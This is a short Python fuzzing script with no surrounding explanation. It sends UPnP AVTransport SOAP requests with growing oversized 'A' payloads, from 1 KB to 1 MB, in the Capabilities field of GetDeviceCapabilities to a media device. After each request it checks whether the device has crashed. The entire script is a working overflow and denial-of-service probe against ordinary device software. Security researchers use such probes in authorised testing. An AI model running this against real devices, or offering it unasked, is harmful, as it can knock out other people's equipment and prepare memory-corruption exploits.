import socket, urllib.request, sys

def soap(action, body):
    xml = ('<?xml version="1.0" encoding="utf-8"?>'
           '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
           's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
           '<s:Body>%s</s:Body></s:Envelope>') % body
    req = urllib.request.Request('http://192.0.2.125:38520/service/AVTransport_control',
                                 data=xml.encode(),
                                 headers={'SOAPAction': '"urn:schemas-upnp-org:service:AVTransport:1#%s"' % action})
    try:
        r = urllib.request.urlopen(req, timeout=5)
        d = r.read()
        return r.status, d[:200]
    except Exception as e:
        return 'ERR', str(e)[:120]

def alive():
    try:
        return urllib.request.urlopen('http://192.0.2.125:38520/description.xml', timeout=3).status
    except Exception as e:
        return 'DEAD:' + str(e)[:60]

NS = 'xmlns:u="urn:schemas-upnp-org:service:AVTransport:1"'
for n in [1024, 16384, 131072, 1048576]:
    payload = 'A'*n
    body = '<u:GetDeviceCapabilities %s><InstanceID>0</InstanceID><Capabilities>%s</Capabilities></u:GetDeviceCapabilities>' % (NS, payload)
    st, resp = soap('GetDeviceCapabilities', body)
    print(n, st, resp if isinstance(resp,str) else resp[:80], '| alive:', alive())
    if 'DEAD' in str(alive()): break
